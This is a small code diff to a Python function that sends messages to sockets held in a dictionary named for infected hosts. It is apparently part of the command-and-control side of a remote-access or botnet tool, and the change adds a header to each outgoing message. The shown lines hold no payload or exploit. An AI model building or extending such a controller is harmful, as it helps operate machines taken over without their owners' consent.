@@ -135,7 +135,7 @@ def send_message(message, infected_dict):
     else:
         if target in infected_dict:
             try:
-                infected_dict[target].send(final_mess.encode("utf-8"))
+                infected_dict[target].send(header + final_mess.encode("utf-8"))
             except Exception as e:
                 print(f"[!] Erreur d'envoi à {target}")
         else:
